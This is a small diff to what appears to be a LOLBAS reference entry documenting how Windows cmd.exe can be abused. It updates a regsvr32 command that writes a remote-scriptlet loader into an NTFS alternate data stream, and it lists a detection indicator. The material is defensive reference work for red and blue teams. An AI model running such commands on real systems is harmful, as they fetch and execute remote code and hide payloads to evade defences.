@@ -2,9 +2,9 @@
 Name: Cmd.exe
 Description: The command-line interpreter in Windows
 Author: 'Ye Yint Min Thu Htut'
-Created: '2019-06-26'
+Created: 2019-06-26
 Commands:
-  - Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
+  - Command: cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
     Description: Add content to an Alternate Data Stream (ADS).
     Usecase: Can be used to evade defensive countermeasures or to hide as a persistence mechanism
     Category: ADS
@@ -23,7 +23,7 @@ Commands:
 Full_Path:
   - Path: C:\Windows\System32\cmd.exe
   - Path: C:\Windows\SysWOW64\cmd.exe
-Code_Sample: 
+Code_Sample:
 - Code:
 Detection:
  - IOC: cmd.exe executing files from alternate data streams.
